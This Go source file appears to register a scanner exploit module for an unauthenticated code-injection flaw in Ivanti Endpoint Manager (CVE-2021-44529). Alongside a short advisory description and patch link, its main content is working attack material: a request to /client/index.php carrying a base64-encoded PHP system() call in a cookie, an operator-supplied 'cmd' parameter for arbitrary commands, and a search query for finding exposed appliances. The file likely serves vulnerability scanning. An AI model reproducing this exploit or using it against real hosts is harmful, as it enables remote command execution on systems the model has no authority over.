package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Ivanti Endpoint Manager index.php file code injection vulnerability (CVE-2021-44529)",
    "Description": "<p>Ivanti Endpoint Manager (EPM) is a set of endpoint security managers from Ivanti Corporation of the United States.</p><p>A security vulnerability exists in Ivanti Endpoint Manager (EPM) that stems from Ivanti EPM allowing an unauthenticated user to execute arbitrary code with limited privileges.</p>",
    "Impact": "<p>A security vulnerability exists in Ivanti Endpoint Manager (EPM) that stems from Ivanti EPM allowing an unauthenticated user to execute arbitrary code with limited privileges.</p>",
    "Recommendation": "<p>Set up a whitelist using a security device firewall, etc.</p><p>Timely update to secure version: <a href=\"https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US\">https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US</a></p>",
    "Product": "Ivanti Endpoint Manager",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Ivanti Endpoint Manager index.php 文件代码注入漏洞 (CVE-2021-44529)",
            "Product": "Ivanti Endpoint Manager",
            "Description": "<p>Ivanti Endpoint Manager（EPM）是美国Ivanti公司的一套端点安全管理器。<br></p><p><span style=\"color: rgb(0, 0, 0); font-size: 14px;\">Ivanti Endpoint Manager（EPM） 存在安全漏洞，该漏洞源于Ivanti EPM允许未经身份验证的用户以有限的权限执行任意代码。</span><br></p>",
            "Recommendation": "<p>1、使用安全设备防火墙等设置白名单</p><p>2、及时更新到安全版本：<a href=\"https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US\">https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US</a></p>",
            "Impact": "<p><span style=\"color: rgb(0, 0, 0); font-size: 14px;\">Ivanti Endpoint Manager（EPM） 存在安全漏洞，该漏洞源于Ivanti EPM允许未经身份验证的用户以有限的权限执行任意代码。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Ivanti Endpoint Manager index.php file code injection vulnerability (CVE-2021-44529)",
            "Product": "Ivanti Endpoint Manager",
            "Description": "<p><span style=\"color: rgb(0, 0, 0); font-size: 14px;\"></span>Ivanti Endpoint Manager (EPM) is a set of endpoint security managers from Ivanti Corporation of the United States.</p><p>A security vulnerability exists in Ivanti Endpoint Manager (EPM) that stems from Ivanti EPM allowing an unauthenticated user to execute arbitrary code with limited privileges.<br></p>",
            "Recommendation": "<p>Set up a whitelist using a security device firewall, etc.</p><p>Timely update to secure version: <a href=\"https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US\">https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US</a></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">A security vulnerability exists in Ivanti Endpoint Manager (EPM) that stems from Ivanti EPM allowing an unauthenticated user to execute arbitrary code with limited privileges.</span><br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "title=\"LANDesk(R) Cloud Services Appliance\"",
    "GobyQuery": "title=\"LANDesk(R) Cloud Services Appliance\"",
    "Author": "abszse",
    "Homepage": "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44529.yaml",
    "DisclosureDate": "2022-03-23",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-44529"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202112-724"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/client/index.php",
                "follow_redirect": false,
                "header": {
                    "Cookie": "ab=ab; c=c3lzdGVtKCJpZCIpOw==; d=; e=;"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "gid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/client/index.php",
                "follow_redirect": false,
                "header": {
                    "Cookie": "ab=ab; c=c3lzdGVtKCJpZCIpOw==; d=; e=;"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "gid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "c3lzdGVtKCJpZCIpOw==",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6874"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
